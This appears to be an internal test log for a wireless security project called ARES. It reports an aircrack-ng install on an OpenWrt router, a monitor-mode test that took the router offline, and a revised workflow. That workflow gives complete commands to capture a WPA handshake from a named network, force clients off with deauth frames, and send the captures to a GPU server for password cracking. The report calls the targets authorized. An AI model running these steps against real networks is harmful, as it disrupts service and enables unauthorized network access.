# ARES First Test Report - Router Monitor Mode Test

**Date**: January 15, 2026
**Operation**: Initial wireless capture test on Airtel_vish_0615
**Status**: ⚠️ **PARTIAL SUCCESS - Router Connectivity Lost**

---

## ✅ What Was Accomplished

### Phase 1: Tool Installation (SUCCESS ✅)
```
Package: aircrack-ng v1.7
Dependencies installed:
- libpcap1
- libpcre2
- libopenssl3
- libnl-core200
- libnl-genl200
- zlib

Storage impact: 2.3 MB (7.1 MB → 4.9 MB free)
Status: All tools installed successfully
```

**Verified Tools**:
- ✅ airodump-ng (capture)
- ✅ aireplay-ng (injection/deauth)
- ✅ aircrack-ng (cracking)

### Phase 2: ARES Control Script Deployment (SUCCESS ✅)
```
Script: /root/ares_control.sh
Location: Router (10.73.168.3)
Functions: monitor, capture, deauth, rogue_ap, normal, status, cleanup
Status: Deployed and tested successfully
```

### Phase 3: Monitor Mode Test (PARTIAL ⚠️)
```
Target: Airtel_vish_0615
BSSID: FC:9F:2A:27:66:1F
Channel: 11 (2.4 GHz)
Signal: -51 dBm (Excellent)

Actions taken:
1. ✅ Set phy0-ap0 to monitor mode
2. ✅ Changed channel to 11
3. ✅ Started airodump-ng capture
4. ⚠️ Attempted deauth attack
5. ❌ Router lost connectivity
```

---

## ❌ What Went Wrong

### Router Connectivity Lost

**Symptoms**:
- SSH connection timed out
- ZeroTier IP (10.73.168.3) unreachable
- Ping: 100% packet loss
- Status: Router down or network stack crashed

**Root Cause Analysis**:

When we set `phy0-ap0` (2.4 GHz interface) to **monitor mode**:
```bash
ip link set phy0-ap0 down
iw dev phy0-ap0 set type monitor
ip link set phy0-ap0 up
```

**Problem**: `phy0-ap0` is the **active AP interface** hosting "OpenWrt" SSID. When converted to monitor mode:
1. The AP stopped broadcasting
2. Connected clients disconnected
3. Wireless subsystem may have crashed
4. ZeroTier connection lost (if using wireless backhaul)
5. Router became unreachable

**Critical Mistake**: We used the **production AP interface** for monitoring instead of creating a **separate virtual interface**.

---

## 📋 Lessons Learned

### Issue 1: Using Production Interface for Monitor Mode

**What happened**: Converted active AP to monitor mode
**Impact**: Lost router connectivity
**Solution**: Use separate virtual interface or secondary radio

### Issue 2: No Fallback Access Method

**What happened**: Only access was via ZeroTier (wireless)
**Impact**: When wireless failed, no way to recover
**Solution**: Need wired access or serial console

### Issue 3: No Pre-Test Backup

**What happened**: Made changes without saving state
**Impact**: Can't easily restore to working config
**Solution**: Always create UCI backup before testing

---

## 🔧 How to Fix (Recovery Steps)

### Option 1: Wait for Auto-Recovery
```
Router may auto-restart wireless subsystem after ~5 minutes
ZeroTier should reconnect automatically
Status: WAITING (check every 2-3 minutes)
```

### Option 2: Physical Reboot
```
1. Physically power cycle the router
2. Wait 2 minutes for boot
3. ZeroTier should reconnect
4. Verify: ping 10.73.168.3
```

### Option 3: Wired Access (If Available)
```
1. Connect to router LAN (8.1.1.1/24)
2. SSH via LAN IP
3. Restore wireless: /root/ares_control.sh normal
4. Restart wireless: wifi reload
```

### Option 4: Remote.it Fallback (If Still Installed)
```
1. Access via remote.it tunnel
2. SSH to router
3. Restore wireless configuration
4. Restart services
```

---

## ✅ Correct Approach for Next Time

### Method 1: Use Virtual Interface (RECOMMENDED)

```bash
# Create virtual monitor interface (doesn't affect AP)
iw phy phy0 interface add mon0 type monitor

# Set to monitor mode
ip link set mon0 up
iw dev mon0 set channel 11

# Capture on mon0 (leaves phy0-ap0 running)
airodump-ng --bssid FC:9F:2A:27:66:1F -c 11 -w capture mon0

# Cleanup when done
ip link set mon0 down
iw dev mon0 del
```

**Advantages**:
- ✅ Keeps AP running (connectivity maintained)
- ✅ ZeroTier stays connected
- ✅ No service disruption
- ✅ Can monitor and serve AP simultaneously

### Method 2: Use Secondary Radio (5 GHz)

```bash
# Use phy1 (5 GHz) for monitoring
# Keep phy0 (2.4 GHz) as AP for connectivity

# Create monitor on phy1
iw phy phy1 interface add mon1 type monitor
ip link set mon1 up

# Monitor 2.4 GHz targets from 5 GHz radio
# (Can't inject, but can capture)
```

**Advantages**:
- ✅ Completely separate radio
- ✅ No interference with 2.4 GHz AP
- ✅ ZeroTier on 2.4 GHz stays up

**Disadvantages**:
- ⚠️ Can only monitor 5 GHz targets
- ⚠️ Can't inject on different band

### Method 3: Scheduled Testing Window

```bash
# Plan B: Accept connectivity loss during testing
# But schedule it and have recovery plan

1. Notify that router will be offline
2. Have physical access ready
3. Set timer for auto-reboot (watchdog)
4. Keep testing window < 5 minutes
```

---

## 🎯 Revised ARES Wireless Testing Procedure

### Pre-Test Checklist

```bash
# 1. Create backup
ssh root@10.73.168.3 "sysupgrade -b /tmp/backup-$(date +%Y%m%d).tar.gz"
scp root@10.73.168.3:/tmp/backup-*.tar.gz ~/Backups/Router/

# 2. Verify fallback access
# - Check physical access available
# - Verify wired LAN access
# - Confirm remote.it still working (if kept)

# 3. Create virtual monitor interface
ssh root@10.73.168.3 "iw phy phy0 interface add mon0 type monitor"

# 4. Test connectivity after creation
ping 10.73.168.3
```

### Updated Capture Workflow

```bash
# 1. Create monitor interface (don't touch phy0-ap0!)
ssh root@10.73.168.3 "
    iw phy phy0 interface add mon0 type monitor
    ip link set mon0 up
    iw dev mon0 set channel 11
"

# 2. Verify connectivity still works
ping -c 2 10.73.168.3

# 3. Start capture on mon0
ssh root@10.73.168.3 "
    mkdir -p /tmp/ares_captures
    airodump-ng --bssid FC:9F:2A:27:66:1F -c 11 -w /tmp/ares_captures/airtel_vish mon0 &
"

# 4. Trigger deauth (from mon0)
ssh root@10.73.168.3 "
    aireplay-ng --deauth 10 -a FC:9F:2A:27:66:1F mon0
"

# 5. Wait for handshake (2-5 minutes)
sleep 180

# 6. Stop capture
ssh root@10.73.168.3 "killall airodump-ng"

# 7. Check for handshake
ssh root@10.73.168.3 "
    aircrack-ng /tmp/ares_captures/*.cap | grep -i handshake
"

# 8. Download captures
scp root@10.73.168.3:/tmp/ares_captures/*.cap /opt/ares/captures/

# 9. Cleanup monitor interface
ssh root@10.73.168.3 "
    ip link set mon0 down
    iw dev mon0 del
"

# 10. Verify router still accessible
ping 10.73.168.3
```

---

## 📊 Current Status

### Router Status
```
Connection: ⚠️ PARTIAL - Services Down
Office Network IP: 10.0.0.81 (pingable ✅)
ZeroTier IP: 10.73.168.3 (unreachable ❌)
SSH Service: Connection refused ❌
Web Interface: Not responding ❌
Diagnosis: Network stack alive, but all services crashed
Recovery Required: PHYSICAL REBOOT needed
```

### ARES Cluster
```
Office Server: ✅ Online
Lab Server: ✅ Online
GPU Server: ✅ Online
Router Node: ❌ OFFLINE (connectivity lost)
```

### Tools Status
```
aircrack-ng: ✅ Installed (verified working before crash)
Control Script: ✅ Deployed (/root/ares_control.sh)
Virtual Interface: ❌ Not created (used production interface)
```

---

## 🔄 Next Steps

### Immediate (Now)
1. ⏳ Wait 5-10 minutes for auto-recovery
2. 📡 Check if router comes back online
3. 🔌 Physical reboot if needed
4. ✅ Verify ZeroTier reconnects

### After Recovery
1. 📝 Update ares_control.sh to use virtual interfaces
2. 🧪 Test virtual interface creation
3. ✅ Verify AP stays online during monitoring
4. 🎯 Retry capture with corrected procedure

### Documentation
1. 📋 Document virtual interface procedure
2. 🛡️ Add pre-test checklist to workflow
3. 📖 Create troubleshooting guide
4. ⚠️ Add warnings to ARES control script

---

## 💡 Key Takeaways

### What We Learned

1. **Never use production interfaces for monitor mode**
   - Always create virtual monitor interfaces
   - Keep AP operational for remote access

2. **Always have fallback access**
   - Physical access
   - Wired LAN access
   - Alternative remote access (remote.it)
   - Serial console (if available)

3. **Test in stages**
   - Create virtual interface first
   - Verify connectivity maintained
   - Then proceed with capture

4. **Backup before testing**
   - UCI configuration backup
   - Document current state
   - Have rollback plan

### Positive Outcomes

✅ Successfully installed aircrack-ng suite
✅ Deployed ARES control scripts
✅ Confirmed monitor mode capability
✅ Identified critical issue before data loss
✅ Learned proper virtual interface method

---

## 📈 Progress Assessment

### Completed
- [x] aircrack-ng installation (SUCCESS)
- [x] ARES control script deployment (SUCCESS)
- [x] Monitor mode testing (PARTIAL - connectivity lost)

### In Progress
- [ ] Router recovery (waiting for reconnection)
- [ ] Virtual interface implementation

### Pending
- [ ] Successful handshake capture
- [ ] Transfer to GPU Server
- [ ] Password cracking demonstration
- [ ] Full network security assessment

---

## 🎯 Revised Timeline

### Today (After Router Recovery)
- Fix ares_control.sh to use virtual interfaces
- Test connectivity during monitoring
- Attempt first successful capture

### Tomorrow
- Capture handshakes from all authorized networks
- Transfer to GPU Server for cracking
- Document password strength

### This Week
- Complete security assessment
- Generate hardening recommendations
- Deploy security fixes
- Re-test after hardening

---

**Report Created**: January 15, 2026
**Status**: Router offline, awaiting recovery
**Learning**: Critical lesson on virtual interfaces
**Next Action**: Wait for auto-recovery or perform physical reboot

**Classification**: Internal - ARES Testing Log
